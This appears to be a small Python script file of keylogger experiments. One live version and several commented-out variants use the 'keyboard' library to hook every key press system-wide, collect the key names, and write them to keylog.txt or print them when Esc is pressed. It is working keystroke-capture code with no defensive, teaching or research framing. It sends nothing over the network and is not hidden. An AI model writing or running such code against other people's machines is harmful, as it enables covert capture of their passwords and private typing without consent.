# import keyboard

# keys = []

# def on_key_press(event):
#     if event.name == 'esc':
#         keyboard.unhook_all()
#         with open('keylog.txt', 'w') as file:
#             file.write('\n'.join(keys))
#     else:
#         keys.append(event.name)

# keyboard.on_press(on_key_press)

# keyboard.wait('esc')


# import keyboard

# keys = []

# def on_key_press(event):
#     if event.name == 'esc':
#         keyboard.unhook_all()
#         with open('keylog.txt', 'w') as file:
#             file.write(' '.join(keys))
#     else:
#         keys.append(event.name)

# keyboard.on_press(on_key_press)

# keyboard.wait('esc')




import keyboard

keys = []

def on_key_press(event):
    if event.name == 'esc':
        keyboard.unhook_all()
        with open('keylog.txt', 'w') as file:
            file.write(''.join(keys))
    else:
        keys.append(event.name)

keyboard.on_press(on_key_press)

keyboard.wait('esc')





# import keyboard

# keys = []

# def on_key_press(event):
#     if event.name == 'esc':
#         keyboard.unhook_all()
#         print(' '.join(keys))
#     else:
#         keys.append(event.name)

# keyboard.on_press(on_key_press)

# keyboard.wait('esc')

























# def on_key_press(event):
#     if event.name == 'esc':
#         keyboard.unhook_all()
#         with open('keylog.txt', 'w') as file:
#             file.write('\n'.join(keys))
#     else:
#         keys.append(event.name)

# def on_key_press(event):
#     if event.name == 'esc':
#         keyboard.unhook_all()
#         print(' '.join(keys))
#     else:
#         keys.append(event.name)

# keyboard.on_press(on_key_press)

# keyboard.wait('esc')
